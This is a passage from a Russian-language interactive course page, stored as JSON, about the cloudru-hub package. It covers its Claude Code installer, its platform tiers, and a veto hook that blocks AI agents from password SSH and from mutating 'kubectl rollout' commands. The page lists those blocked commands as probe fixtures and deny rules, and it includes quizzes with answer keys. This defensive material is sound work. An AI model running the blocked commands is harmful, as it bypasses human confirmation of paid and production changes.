свойств безопасности пакета: logs остаётся ask, и мутационный гейт доказывает, что откат к allow ловится тестом."}],"finalTest":{"id":"final-behaviour-audit-not-schema","sectionId":"behaviour-audit-not-schema","question":"На каком основании инструмент движка получает разрешение allow?","options":["Только по поведенческому аудиту обработчика: код прочитан на закреплённой версии, вывод «только чтение», ссылка файл:строка","По схеме: если в описании написано «читает» и нет свойства confirmed","По имени: всё, что начинается с list_ или get_","По голосованию пользователей"],"correctAnswer":0}},{"id":"install-claude-code","order":8,"title":"8. Установка в Claude Code с исполненной пробой вето","shortTitle":"Установка","description":"Три файла, слияние без затирания — и установщик, который отказывается говорить «готово», пока не увидел вето своими глазами.","icon":"🔧","interactiveType":"builder","keyConcept":"исполненная проба вето","methodPattern":"P2","source":"src/install.js","theory":"Пора ставить связку в настоящий проект. Лена в папке своего проекта запускает: `cloudru-hub install --target claude-code --dir /path/to/project` (без `--dir` берётся текущая папка). Установщик делает три вещи и одну проверку.\n\nТри файла — всегда слиянием, никогда затиранием твоих настроек:\n\n1. **`.mcp.json`** в корне проекта — сервер `cloudru-vm`, команда `node \u003cпуть к лаунчеру\u003e mcp`. С флагом `--npx` вместо пути подставится `npx -y @dzhechkov/cloudru-hub mcp`. Именно `.mcp.json` в корне: `.claude/mcp.json` Claude Code не читает — измеренный провал.\n2. **`.claude/settings.json`** — тормоз платных шагов как данные: `allow` / `ask` / `deny` в обоих написаниях префикса, объединение множествами (твои правила остаются, наши deny не могут выпасть) и хуки `PreToolUse` на `Bash` и на `mcp__cloudru[-_]vm__k8s_kubectl`.\n3. **`.claude/hooks/cloudru-ssh-guard.cjs`** — сам вето-хук, скопированный из шаблона с правом на выполнение.\n\nА теперь то, ради чего секция. Файлы лежат — но **наличие файла хука — не доказательство**, что хук работает. Поэтому установщик проводит **исполненную пробу вето**: прогоняет через только что записанный хук четыре контрольных случая и сверяет коды выхода:\n\n- `sshpass -p hunter2 ssh user1@1.2.3.4` → ждёт **exit 2** (запрещено);\n- `ssh -i /tmp/key user1@1.2.3.4 uptime` → ждёт **exit 0** (разрешено, ключ есть);\n- `k8s_kubectl rollout restart deployment/app` → ждёт **exit 2**;\n- `k8s_kubectl rollout status deployment/app` → ждёт **exit 0**.\n\nЛюбое несовпадение — установщик печатает `NOT installed` и возвращает код 1. Хук, который не блокирует, неотличим от отсутствующего, и «готово» он не скажет.\n\n**Компромисс:** установщик проверяет всё, что может проверить с диска, но одну вещь машина отсюда увидеть не может: спросит ли Claude Code разрешение на самом деле. Поэтому в конце он печатает ручную пробу: открыть свежую сессию, позвать `mcp__cloudru-vm__deploy` и убедиться, что появился запрос разрешения, — и записать, какое написание префикса среда использовала.\n\n🧾 **Квитанция.** У Лены четыре строки `probe … ✓` и `cloudru-hub install: ✓ veto EXECUTED and observed on the forbidden fixtures.` — exit 0. Без этой строки установки не было, что бы ни лежало на диске.","reflection":{"strengths":"Три файла слиянием без затирания; тормоз как данные в обоих написаниях; исполненная проба вето — установщик отказывается сообщать успех, пока не увидел exit 2 на запрещённом случае.","weaknesses":"Последний шаг — реальный запрос разрешения в сессии Claude Code — машина проверить не может, он остаётся ручной пробой; .mcp.json пишется только в корень проекта.","rating":"5/5","wrapup":"Установка завершена не когда файлы легли, а когда исполненная проба вето показала exit 2 на sshpass и rollout restart."},"exercise":{"instruction":"Собери команду, которой Лена ставит полную связку в проект ./my-project (целевая платформа claude-code); установщик завершит её исполненной пробой вето.","parts":["cloudru-hub","install","--target","claude-code","--dir","./my-project"],"correctCommand":"cloudru-hub install --target claude-code --dir ./my-project","hints":["Подкоманда install, платформа задаётся флагом --target","Папка проекта — флаг --dir; без него берётся текущая"]},"quiz":[{"id":"install-q1","question":"Файлы записаны, но проба sshpass вернула exit 0 вместо 2. Что сообщит установщик?","options":["«Установлено», предупредив мелким шрифтом","«NOT installed», код 1: исполненная проба вето не увидела блокировку, а хук без блокировки неотличим от отсутствующего","Удалит .mcp.json","Повторит пробу через минуту"],"correctAnswer":1,"explanation":"Успех установки условен: он объявляется только после наблюдённого вето на запрещённых случаях."}],"finalTest":{"id":"final-install-claude-code","sectionId":"install-claude-code","question":"Что такое исполненная проба вето при установке в claude-code?","options":["Установщик прогоняет четыре контрольных случая через записанный хук и объявляет успех только если запрещённые дали exit 2, а разрешённые — exit 0","Проверка, что файл хука существует на диске","Запрос к Cloud.ru о балансе счёта","Проверка версии Claude Code"],"correctAnswer":0},"diagram":{"kind":"flow","title":"Установка в claude-code: три файла и проба, без которой нет «готово»","nodes":[{"id":"mcp","label":".mcp.json","note":"сервер cloudru-vm → лаунчер mcp"},{"id":"settings","label":"settings.json","note":"allow/ask/deny + хуки, слияние"},{"id":"hook","label":"Хук на диск","note":".claude/hooks/cloudru-ssh-guard.cjs"},{"id":"probe","label":"Проба вето","note":"4 случая: ждём exit 2 / 0 — иначе NOT installed","accent":true}]}},{"id":"target-tiers","order":9,"title":"9. Ярусы целевых платформ: кому полная связка, кому указатель","shortTitle":"Ярусы","description":"Claude Code, codex, agents-md, cursor: четыре яруса доставки и честный отказ там, где тормоз поставить нельзя.","icon":"🪜","interactiveType":"matching","methodPattern":"P10","keyConcept":"ярус целевой платформы","source":"src/install.js","theory":"Коллега Лены работает в Cursor и попросил: «поставь мне то же самое». Лена запустила `cloudru-hub install --target cursor` — и получила отказ с кодом 2. Не ошибку, а осознанное «нет» с причиной. Прежде чем читать почему, реши за неё: честнее выдать Cursor «почти такую же» установку без работающего вето — или отказать?\n\nПакет отвечает вторым. **Ярус целевой платформы** (решение ADR-005) — это уровень доставки, который платформа заслужила живой проверкой, а не обещанием документации. Ярусов четыре:\n\n1. **full — `claude-code`.** Полная установка из прошлой секции: `.mcp.json`, тормоз, хук и исполненная проба. Код 0.\n2. **plan-only — `codex`.** План печатается, но НЕ применяется: код 3. Причина измерена: проектный `hooks.json` в codex — молчаливый no-op, хуки работают только из пользовательского `~/.codex/hooks.json`, а неисполненное вето неотличимо от отсутствующего. План — три шага: `codex mcp add cloudru-vm -- cloudru-hub mcp`, слияние хука в пользовательский файл и **обязательная** ручная проба `sshpass` в сессии codex.\n3. **pointer — `agents-md`, `gemini`.** Только указатель: файл `CLOUDRU-POINTER.md` не длиннее 2048 символов, без инструментов и без исполняемых инструкций, зато с обязательным предупреждением «здесь НЕТ детерминированного вето платных операций». Код 0, но честно: это не установка, это табличка.\n4. **degraded (отказ) — `openclaude`, `opencode`, `cursor`, `windsurf`, `copilot`.** Код 2 и причина по имени. У Cursor вето-хуки только описаны в документации, у Windsurf бюджет инструментов 100 \u003c 144, у Copilot агент «не будет спрашивать вашего одобрения» по построению. Пока живая проба не доказала обратное — отказ.\n\nНеизвестное имя платформы — код 1 и список известных.\n\n**Компромисс:** ярусы сужают аудиторию: полную связку сегодня получает только Claude Code. Зато ни одна платформа не получает «поддержку» на бумаге, которая ночью пропустит `deploy` без вопроса. Ярус можно поднять — но живой пробой, а не правкой таблицы.\n\nЛена отправила коллеге указатель для AGENTS.md и честное «в Cursor тормоза нет — не запускай оттуда мутирующие инструменты».","reflection":{"strengths":"Ярус целевой платформы назначается по живой проверке: full только там, где вето исполнено; plan-only, pointer и отказ — каждый с кодом выхода и причиной; никакой поддержки на бумаге.","weaknesses":"Полная связка сегодня только у Claude Code; codex требует ручных шагов; пять платформ ждут живой пробы, чтобы выйти из отказа.","rating":"4/5","wrapup":"Ярус целевой платформы = что доказано живой пробой: full, plan-only, pointer или отказ. Вспомни, что ты выбрал за Лену для Cursor — и что перевесило после объяснения."},"exercise":{"pairs":[{"left":"claude-code","right":"Ярус full: .mcp.json + тормоз + хук + исполненная проба, код 0"},{"left":"codex","right":"Ярус plan-only: план из трёх шагов печатается, не применяется, код 3"},{"left":"agents-md / gemini","right":"Ярус pointer: CLOUDRU-POINTER.md ≤ 2048 символов с предупреждением «нет вето», код 0"},{"left":"cursor / windsurf / copilot / openclaude / opencode","right":"Ярус degraded: отказ с причиной, код 2 — до живой пробы"},{"left":"Неизвестное имя платформы","right":"Код 1 и список известных целевых платформ"}]},"quiz":[{"id":"tiers-q1","question":"Почему codex получает только план (код 3), а не установку?","options":["У codex нет поддержки MCP","Проектный hooks.json в codex — измеренный молчаливый no-op; вето нужно слить в пользовательский файл и проверить вручную, иначе оно неотличимо от отсутствующего","Автор пакета не пользуется codex","codex запрещает сторонние хуки лицензией"],"correctAnswer":1,"explanation":"Доставка требует исполненной пробы вето; пока она ручная, установщик честно печатает план вместо «готово»."}],"finalTest":{"id":"final-target-tiers","sectionId":"target-tiers","question":"Что определяет ярус целевой платформы в cloudru-hub?","options":["Что доказано живой пробой: полная связка только там, где вето исполнено; иначе план, указатель или отказ с причиной","Популярность платформы среди пользователей","Наличие у платформы поддержки MCP в документации","Версия Node.js на машине"],"correctAnswer":0},"diagram":{"kind":"scale","title":"Четыре яруса доставки: чем ниже, тем меньше доказано","topLabel":"доказано живой пробой","bottomLabel":"ничего не доказано","nodes":[{"id":"full","label":"full","note":"claude-code — файлы + исполненное вето, код 0","accent":true},{"id":"plan","label":"plan-only","note":"codex — план из 3 шагов, код 3"},{"id":"pointer","label":"pointer","note":"agents-md, gemini — табличка ≤ 2048 символов"},{"id":"degraded","label":"отказ","note":"cursor, windsurf, copilot… — код 2 с причиной"}]}},{"id":"veto-hook-inside","order":10,"title":"10. Вето-хук изнутри: exit 0 или exit 2","shortTitle":"Вето-хук","description":"Тридцать строк, которые стоят между агентом и парольным SSH: как хук читает вызов и чем отвечает.","icon":"🚦","interactiveType":"drag-and-drop","keyConcept":"exit 2 означает вето","methodPattern":"P1","source":"templates/.claude/hooks/cloudru-ssh-guard.cjs","theory":"Посмотри сначала на схему ниже, потом на текст: хук — это конвейер из четырёх шагов, и весь его смысл в последнем. Лена открыла `templates/.claude/hooks/cloudru-ssh-guard.cjs` и удивилась, какой он короткий.\n\nКонтракт хука `PreToolUse` в Claude Code простой: перед вызовом инструмента среда запускает хук, подаёт ему на stdin JSON `{ tool_name, tool_input }` и смотрит на код выхода. **exit 0 означает «разрешаю», exit 2 означает вето** — вызов не состоится, а текст со stderr увидит модель и поймёт, почему.\n\nЧто хук запрещает — три правила из функции `decide()`:\n\n- **Bash + `sshpass` + адрес ВМ** (`@1.2.3.4`) → вето: «парольный SSH к Cloud.ru ВМ запрещён — ключ на ВМ есть, движок кладёт его сам; возьми ssh-команду из ответа `deploy_apply` дословно».\n- **Bash + `ssh user1@\u003cip\u003e` без ` -i `** → вето: SSH без деплой-ключа.\n- **`mcp__cloudru-vm__k8s_kubectl` (в любом написании префикса) + `rollout \u003cглагол\u003e`**, где глагол не `status` и не `history` → вето: `rollout restart`, `undo` и прочие изменяют прод без подтверждения — это измеренная дыра классификатора движка, и хук закрывает её на нашей стороне независимо от движка.\n\nВсё остальное → exit 0. И одна тонкость, которую стоит знать: если на stdin пришёл не-JSON, хук выходит с 0, а не с 2. Сломанный хук не должен заблокировать каждый вызов Bash в сессии — но **разобранный** вызов с платным шагом всегда получает детерминированный ответ.\n\n**Компромисс:** правила — регулярные выражения, перенесённые из исходного хука движка как есть; они точны на измеренных случаях и не претендуют на полноту. Хук — второй ремень поверх правил ask/deny, а не замена им: правило разрешений останавливает инструмент по имени, хук — по содержимому аргументов.\n\n🧾 **Квитанция.** Лена проверила руками: `echo '{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"sshpass -p x ssh user1@1.2.3.4\"}}' | node .claude/hooks/cloudru-ssh-guard.cjs; echo $?` → на stderr строка с ⛔, код выхода 2.","reflection":{"strengths":"Хук короткий и читаемый: три правила, exit 2 означает вето с объяснением для модели; закрывает дыру rollout независимо от движка; второй ремень поверх ask/deny.","weaknesses":"Регулярные выражения точны только на измеренных формах; не-JSON на входе пропускается (exit 0) — осознанный fail-open ради работоспособности сессии.","rating":"4/5","wrapup":"JSON на stdin → decide() → exit 2 означает вето, exit 0 — пропуск; хук ловит по содержимому аргументов то, что правила ловят по имени."},"exercise":{"instruction":"Лена восстанавливает путь одного вызова через вето-хук. Расставь шаги в порядке выполнения — от вызова инструмента до кода выхода, где exit 2 означает вето.","items":[{"id":"call","label":"Агент вызывает инструмент (Bash или k8s_kubectl); Claude Code запускает PreToolUse-хук"},{"id":"stdin","label":"Хук читает JSON { tool_name, tool_input } со stdin и разбирает его"},{"id":"decide","label":"decide() сверяет команду с правилами: sshpass, ssh без -i, rollout не status/history"},{"id":"exit","label":"Совпало → причина на stderr и exit 2 (вето); не совпало → exit 0 (вызов идёт дальше)"}],"correctOrder":["call","stdin","decide","exit"]},"quiz":[{"id":"hook-q1","question":"Агент зовёт k8s_kubectl с аргументом «rollout history deployment/app». Что сделает хук?","options":["exit 2 — любой rollout запрещён","exit 0 — status и history разрешены, вето только на остальные глаголы rollout","exit 1 — ошибка разбора","Спросит пользователя"],"correctAnswer":1,"explanation":"Правило точечное: rollout status|history читают, остальные глаголы rollout изменяют прод и получают вето."}],"finalTest":{"id":"final-veto-hook-inside","sectionId":"veto-hook-inside","question":"Что означает код выхода 2 у вето-хука cloudru-ssh-guard?","options":["exit 2 означает вето: вызов инструмента не состоится, причина уходит модели через stderr","Хук упал с ошибкой и вызов выполнится","Нужно повторить вызов","Вызов разрешён с предупреждением"],"correctAnswer":0},"diagram":{"kind":"flow","title":"Путь вызова через вето-хук: четыре шага, решает последний","nodes":[{"id":"call","label":"Вызов инструмента","note":"Bash или k8s_kubectl → PreToolUse"},{"id":"stdin","label":"JSON на stdin","note":"{ tool_name, tool_input }"},{"id":"decide","label":"decide()","note":"sshpass · ssh без -i · rollout не status/history"},{"id":"exit","label":"exit 2 / exit 0","note":"2 = вето + причина на stderr; 0 = пропуск","accent":true}]}},{"id":"dialect-compiler","order":11,"title":"11. Компилятор диалектов: один канон, много целей","shortTitle":"Диалекты","description":"Из канонического навыка движка — варианты под платформы, с жёстким отказом, если в выходе выжил чужой диалект.","icon":"🗣️","interactiveType":"scenario","keyConcept":"компилятор диалектов","methodPattern":"D3","source":"src/dialects.js","theory":"Эта секция — про твои решения, а не про готовые ответы. У Лены есть дистрибутив движка с папкой `skill/cloudru-hub/` — канонический навык, написанный на диалекте движка Hermes: свои имена инструментов (`tool_search`, `tool_call`), свои пути, свои словечки. В Claude Code это всё — мусор, который агент примет за инструкции. Что делать?\n\n**Компилятор диалектов** (решение ADR-006) — это генератор: один канонический источник, а варианты под платформы порождаются из `data/dialects.json`, ручные форки запрещены. Команда: `cloudru-hub compile-skill --canonical \u003cдвижок\u003e/skill/cloudru-hub --target claude-code --out ./skill-out`. Канонический корпус в пакете НЕ лежит (ноль байтов движка, помнишь?) — ты сам указываешь на него `--canonical`.\n\nЧто компилятор гарантирует кодом, а не ревьюером — четыре инварианта:\n\n1. **Диалект вычищен.** Замены применяются по порядку ко всем `.md` (23 для claude-code, 22 для codex), после чего компилятор ТРЕБУЕТ, чтобы не выжил ни один из 8 запрещённых токенов Hermes (`tool_search`, `tool_call`, `/opt/data`, `SOUL`, «капитан»…). Выжил — жёсткий отказ, вариант не пишется.\n2. **Кодовое имя движка не просочилось** — ни в каком регистре, ни в одном выходном файле: `hermes`, `dzhechko`, `cloudru-vm-cli`, `captainkeys` по границам слов. Это позитивный инвариант поверх списка замен: измерено, что один список замен пропустил голое кодовое имя 5 раз.\n3. **Битые ссылки расцеплены.** Относительная ссылка на `.md`, которого нет в выходе, превращается в текст без ссылки и считается — инструкция не указывает в пустоту.\n4. **Размер и детерминизм.** Роутер навыка не длиннее 12 000 символов на платформах с потерями; компиляция — чистая функция от (байты канона, конфиг): два прогона дают байт-в-байт одинаковый результат.\n\nОтдельная хитрость: голое `cloudru-vm` кодовым именем НЕ считается — это же законное имя MCP-сервера, которое обязано быть в выходе. Вместо этого вычищаются две однозначные формы утечки: путь `.cloudru-vm` → `.cloudru-hub` и вызов `cloudru-vm deploy` → `cloudru-hub deploy` для реального набора глаголов движка.\n\n**Компромисс:** компилятор строг — падает целиком на одном выжившем токене, и это раздражает при первом прогоне. Но альтернатива — навык, который в Claude Code уверенно советует несуществующий `tool_search`. Отказ громкий и до отгрузки; ложь — тихая и после.\n\nЛена на первом прогоне получила именно такой отказ — выжил один путь `/opt/data` — и поправила таблицу замен, а не проверку. Теперь реши за неё сам — три развилки в упражнении.","reflection":{"strengths":"Компилятор диалектов даёт варианты из одного канона с четырьмя инвариантами в коде: чистка диалекта, позитивный запрет кодового имени, расцепление битых ссылок, лимит роутера и детерминизм.","weaknesses":"Канон нужно принести снаружи; отказ на одном выжившем токене останавливает весь прогон; пока только две целевые платформы (claude-code, codex).","rating":"4/5","wrapup":"Один канон, варианты генерируются, ручные форки запрещены: компилятор диалектов лучше откажет громко, чем отгрузит навык, который лжёт платформе."},"exercise":{"title":"Лена компилирует навык под Claude Code — три развилки","scenario":"У Лены есть дистрибутив движка с каноническим навыком. Ей нужен вариант для Claude Code без диалекта Hermes. Прими три решения за неё.","steps":[{"description":"Развилка 1. Как получить вариант под Claude Code?","options":[{"text":"Запустить компилятор диалектов: cloudru-hub compile-skill --canonical \u003cдвижок\u003e/skill/cloudru-hub --target claude-code --out ./skill-out","result":"positive","feedback":"Верно: вариант генерируется из канона по data/dialects.json, и все четыре инварианта проверяются кодом."},{"text":"Скопировать папку навыка и править слова руками","result":"negative","feedback":"Ручной форк запрещён ADR-006: через месяц у тебя два расходящихся текста, и никто не докажет, что в копии не выжил tool_search."},{"text":"Взять канон как есть — агент сам разберётся","result":"negative","feedback":"Не разберётся: он честно попробует вызвать tool_search, которого в Claude Code нет."}]},{"description":"Развилка 2. Компилятор упал: в одном файле выжил токен «/opt/data». Что делать?","options":[{"text":"Добавить замену в data/dialects.json (или поправить канон) и перекомпилировать","result":"positive","feedback":"Да: лечится источник или таблица замен. Компилятор доказал, что вариант ещё лжёт платформе, — и правильно не записал его."},{"text":"Убрать «/opt/data» из списка запрещённых токенов","result":"negative","feedback":"Это ослабление проверки, а не починка: путь движка уедет в Claude Code как инструкция. Правят вход, а не гейт."},{"text":"Записать вариант вручную, раз компилятор упёрся","result":"negative","feedback":"Компилятор не пишет вариант при отказе именно чтобы такого файла не существовало."}]},{"description":"Развилка 3. В отчёте: «1 dangling link(s) unlinked». Это ошибка?","options":[{"text":"Нет: относительная ссылка вела на файл, которого нет в выходе, — компилятор оставил текст и снял ссылку, чтобы инструкция не указывала в пустоту","result":"positive","feedback":"Верно. Число расцепленных ссылок печатается для прозрачности; компилятор при этом успешен."},{"text":"Да, компиляция провалилась","result":"negative","feedback":"Провал — это ERROR и код 1. Расцепление ссылки — штатное действие с отчётом."},{"text":"Надо вручную дописать недостающий файл в вывод","feedback":"Можно добавить его в канон, если он там нужен, — но править вывод руками нельзя: следующая компиляция его перезапишет."}]}]},"quiz":[{"id":"dialect-q1","question":"Почему голое слово cloudru-vm не входит в список запрещённых кодовых имён?","options":["Забыли добавить","Это законное имя MCP-сервера, которое обязано быть в выходе; вместо запрета вычищаются две однозначные формы утечки — путь .cloudru-vm и вызов cloudru-vm \u003cглагол\u003e","Компилятор не умеет искать по границам слов","Так требует Cloud.ru"],"correctAnswer":1,"explanation":"Измерено: правило по границам слов ловило собственную вставку компилятора «сервера cloudru-vm видны». Поэтому — точечные замены форм утечки, а не запрет слова."}],"finalTest":{"id":"final-dialect-compiler","sectionId":"dialect-compiler","question":"Что делает компилятор диалектов, если в выходном файле выжил запрещённый токен Hermes?","options":["Жёстко отказывает и не записывает вариант — источник или таблица замен правятся, а не проверка","Записывает вариант с предупреждением","Молча удаляет токен","Заменяет токен на cloudru-hub"],"correctAnswer":0},"diagram":{"kind":"parts","title":"Что компилятор гарантирует кодом — убери часть, и вариант начнёт лгать","whole":"Честный вариант навыка под платформу","nodes":[{"id":"dialect","label":"Чистка диалекта","note":"8 токенов Hermes — ни один не выжил"},{"id":"codename","label":"Кодовое имя","note":"hermes, dzhechko… по границам слов","accent":true},{"id":"links","label":"Ссылки","note":"битые расцеплены и посчитаны"},{"id":"size","label":"Размер и детерминизм","note":"роутер ≤ 12 000, байт-в-байт повтор"}]}},{"id":"honesty-gates","order":12,"title":"12. Гейты честности: мутационный гейт и застава лицензии","shortTitle":"Гейты","description":"13 свойств безопасности, каждое доказано красным тестом; лицензионная застава остаётся взведённой после разрешения на публикацию.","icon":"⚖️","interactiveType":"quiz","keyConcept":"мутационный гейт","methodPattern":"P11","source":"README.md#post-grant-publish-checklist-executed-20","theory":"Последняя секция — про то, откуда ты знаешь, что всё сказанное выше правда, а не обещание в README. Остановись и подумай: чему из этого курса ты поверил на слово? Лена честно ответила: «свойствам безопасности». Вот как пакет не даёт себе врать.\n\n**Мутационный гейт** — это проверка, которая нарочно ломает защиту и требует, чтобы тесты стали красными. Гейт (здесь и дальше) — застава: проверка, через которую изменение обязано пройти, чтобы уехать дальше. Логика простая: если ты удалил защиту, а тесты остались зелёными, они не проверяли эту защиту никогда. Каждое из **13 именованных свойств** пакета имеет запись в `test/mutation-registry.json`; запуск `dz mutation-gate --package packages/@dzhechkov/cloudru-hub` удаляет защиту и ждёт красного. Результат 2026-08-12: **13/13 PROVEN**. Среди свойств — всё, что ты прошёл: ноль байтов движка, вето на sshpass и rollout, `stack_status` и `logs` за ask, взведённый запрет кодовых имён, две чистки форм утечки.\n\nВторая застава — **лицензионная**. Разрешение автора движка на публикацию получено 12 августа 2026 и записано в LICENSE (часть 2, `Grant-Confirmation:`). Казалось бы, поле `licenseHold` в `package.json` можно снять. Его оставили **нарочно**: правило `licence-hold` в `dz guard` пропускает удовлетворённую заставу с оставленным триггером — и продолжает при каждой публикации проверять LICENSE (нет заглушки PENDING, есть ссылка на подтверждение), THIRD_PARTY_NOTICES и поле SPDX. Тесты пакета отдельно закрепляют честную формулировку: согласие засвидетельствовано владельцем, никакой выдуманной лицензии от имени автора. Убери поле — `test/pack-holds.test.mjs` покраснеет.\n\nЧек-лист публикации после разрешения — четыре пункта, три закрыты, один открыт честно:\n\n1. ✅ запись о согласии в LICENSE, `license: MIT` только на наш код, `private` снят, триггер оставлен;\n2. ✅ `dz guard check --op publish` проходит;\n3. ⏳ платформенный пакет с бинарником **не опубликован** — ждёт доверенной CI-сборки с `-trimpath` и сверки лицензий Go-зависимостей;\n4. ✅ пакет опубликован штатным релизным путём.\n\nСуммарно: 70 тестов, 70 проходят (`npm test`, node:test, без зависимостей — измерено 2026-08-12).\n\n**Компромисс:** мутационный гейт и застава лицензии — лишняя работа на каждый релиз. Взамен слово «доказано» в README означает наблюдённый красный тест, а не мнение. Спроси себя напоследок: в твоём собственном проекте какое из «гарантированных» свойств умрёт молча, если удалить его защиту? Лена назвала три.","reflection":{"strengths":"Мутационный гейт доказывает каждое из 13 свойств красным тестом (13/13 PROVEN); лицензионная застава остаётся взведённой после разрешения и проверяет LICENSE, NOTICES и SPDX на каждой публикации; открытый пункт чек-листа назван, а не спрятан.","weaknesses":"Дополнительная работа на каждый релиз; платформенный пакет с бинарником всё ещё не опубликован; числа (13/13, 70 тестов) датированы 2026-08-12 и требуют перепроверки при изменениях.","rating":"5/5","wrapup":"Свойство доказано только когда его удаление красит тесты; застава лицензии не снимается после разрешения, а продолжает проверять. Назови в своём проекте защиту, которую ты никогда не пробовал удалить."},"exercise":{},"quiz":[{"id":"gates-q1","question":"Что доказывает мутационный гейт для свойства «logs остаётся ask»?","options":["Что logs работает быстро","Что при переводе logs в allow тестовый набор становится красным — то есть тесты действительно охраняют это свойство","Что Cloud.ru починил инъекцию в logs","Что logs можно вызывать без ключей"],"correctAnswer":1,"explanation":"Мутационный гейт удаляет защиту и требует красного; зелёный после удаления означал бы, что защиту никто не проверял."},{"id":"gates-q2","question":"Разрешение на публикацию получено. Почему поле licenseHold в package.json НЕ удалили?","options":["Забыли","Чтобы правило licence-hold в dz guard продолжало проверять LICENSE, THIRD_PARTY_NOTICES и SPDX при каждой публикации — удовлетворённая застава с триггером проходит, а без триггера проверка исчезла бы","npm требует это поле","Автор движка потребовал оставить"],"correctAnswer":1,"explanation":"Застава остаётся взведённой нарочно; тест pack-holds покраснеет, если поле убрать или запись о согласии испортить."}],"finalTest":{"id":"final-honesty-gates","sectionId":"honesty-gates","question":"Что означает «13/13 PROVEN» у мутационного гейта пакета?","options":["Для каждого из 13 свойств безопасности удаление защиты сделало тесты красными — мутационный гейт доказал, что тесты их охраняют","13 тестов из 13 прошли зелёными","13 инструментов движка проверены вручную","13 платформ получили полную установку"],"correctAnswer":0},"diagram":{"kind":"flow","title":"Как работает мутационный гейт — один цикл на каждое из 13 свойств","cycle":true,"nodes":[{"id":"pick","label":"Взять свойство","note":"запись в test/mutation-registry.json"},{"id":"break","label":"Удалить защиту","note":"например, перевести logs в allow"},{"id":"run","label":"Прогнать тесты","note":"npm test — 70 тестов"},{"id":"red","label":"Ждать красного","note":"красный = PROVEN; зелёный = защиту никто не проверял","accent":true},{"id":"restore","label":"Вернуть защиту","note":"и перейти к следующему свойству"}]}}],"achievements":[{"id":"first-step","title":"Первый шаг","description":"Пройдена первая секция — лаунчер больше не незнакомец.","icon":"👣","conditionRef":{"type":"sections-completed","n":1}},{"id":"halfway","title":"Экватор","description":"Шесть секций из двенадцати позади — тормоз платных шагов разобран.","icon":"⛰️","conditionRef":{"type":"sections-completed","n":6}},{"id":"perfectionist","title":"Перфекционист","description":"Секция пройдена без единой ошибки.","icon":"💯","conditionRef":{"type":"perfect-section"}},{"id":"full-course","title":"Полный курс","description":"Все двенадцать секций пройдены — связка агент ↔ Cloud.ru освоена.","icon":"🎓","conditionRef":{"type":"all-sections"}},{"id":"test-passed","title":"Финальный рубеж","description":"Финальный тест сдан на 70% и выше.","icon":"🏆","conditionRef":{"type":"final-test-pass","min":70}},{"id":"engine-finder","title":"Следопыт движка","description":"Пройдены секции про поиск движка и сверку sha256 — ты знаешь, откуда взялся бинарник и совпал ли хеш.","icon":"🔍","conditionRef":{"type":"section-group","ids":["engine-resolution-order","sha256-pin"]}},{"id":"brake-master","title":"Хранитель тормоза","description":"Пройдены секции про тормоз платных шагов и поведенческий аудит — описание инструмента для тебя больше не доказательство.","icon":"🛑","conditionRef":{"type":"section-group","ids":["paid-step-brake","behaviour-audit-not-schema"]}},{"id":"veto-witness","title":"Свидетель вето","description":"Пройдены установка с исполненной пробой и секция про хук изнутри — ты видел exit 2 своими глазами.","icon":"🚦","conditionRef":{"type":"section-group","ids":["install-claude-code","veto-hook-inside"]}},{"id":"honest-shipper","title":"Честный релизёр","description":"Пройдена секция про гейты честности — ты знаешь, что «доказано» значит красный тест.","icon":"⚖️","conditionRef":{"type":"section-group","ids":["honesty-gates"]}},{"id":"green-run","title":"ALL GREEN","description":"Пройдена секция про self-test — пять шагов до зелёной строки известны наизусть.","icon":"🩺","conditionRef":{"type":"section-group","ids":["self-test-five-steps"]}}],"faqData":[{"question":"Я поставил пакет через npm, а cloudru-hub resolve говорит, что движка нет. Это поломка?","answer":"Нет, это замысел: в пакете ноль байтов движка (ADR-002). Укажи бинарник переменной CLOUDRU_VM_BIN или полем enginePath в ~/.cloudru-hub/config.json. Платформенный пакет @dzhechkov/cloudru-vm-linux-x64 с бинарником пока не опубликован — ждёт доверенной CI-сборки."},{"question":"Нужны ли ключи Cloud.ru, чтобы прогнать self-test?","answer":"Нет. Все пять шагов, включая живой tools/list, работают без учётных данных. Ключи (CLOUDRU_KEY_ID, CLOUDRU_SECRET, CLOUDRU_PROJECT_ID) понадобятся только для реальных вызовов инструментов."},{"question":"Почему в .claude/settings.json каждое правило записано дважды — mcp__cloudru-vm__ и mcp__cloudru_vm__?","answer":"Какое написание префикса использует среда выполнения, ещё не подтверждено живой пробой. Лишнее правило безвредно, пропущенное — опасно, поэтому пишутся оба. Установщик просит записать наблюдённое написание после ручной пробы."},{"question":"Установщик отказал моей платформе (cursor, windsurf, copilot…). Как получить связку?","answer":"Отказ — ярус degraded (ADR-005): вето на этой платформе не доказано живой пробой, а мутирующий путь без тормоза не доставляется никуда. Ярус поднимается живой пробой, не правкой таблицы. Пока — работай из Claude Code или используй pointer-таргет для указателя без инструментов."},{"question":"Можно перевести logs или stack_status в allow, чтобы агент меньше спрашивал?","answer":"Технически — правкой data/tools-classification.json, но это ослабление: logs — измеренная инъекция команды по SSH, stack_status продвигает платные задания на сервере. Оба свойства защищены мутационным гейтом: откат к allow красит тесты."},{"question":"Где взять канонический навык для compile-skill?","answer":"В дистрибутиве движка, папка skill/cloudru-hub рядом с бинарником. Пакет его не содержит по правилу «ноль байтов движка»; укажи путь флагом --canonical."},{"question":"Пакет официальный? Кто отвечает за движок?","answer":"Пакет неофициальный и никак не связан с Cloud.ru. Лаунчер, установщик, компилятор и тесты — Дмитрий Жечков (MIT). Дополнения движка (слой из 144 MCP-инструментов) — Тимур, автор движка Hermes; он одобрил публикацию, но лицензии на сами дополнения не назначал, и пакет их не содержит."}],"footer":{"links":[{"label":"npm: @dzhechkov/cloudru-hub","href":"https://www.npmjs.com/package/@dzhechkov/cloudru-hub"},{"label":"GitHub (зеркало)","href":"https://github.com/djd1m/dz-harness/tree/main/packages/@dzhechkov/cloudru-hub"}]},"feedback":{"repo":"djd1m/dz-harness","packagePath":"packages/@dzhechkov/cloudru-hub"}}</script>

<style>
:root{
  --bg:#f7f7f5; --panel:#ffffff; --ink:#191917; --muted:#6b6b63; --line:#e2e2dc;
  --accent:#c1502e; --accent-soft:#fdf0eb; --ok:#2f7d5d; --bad:#b4402c; --warn:#a2702a;
  --paper:#fffbef; --paper-line:#e6dcc0;
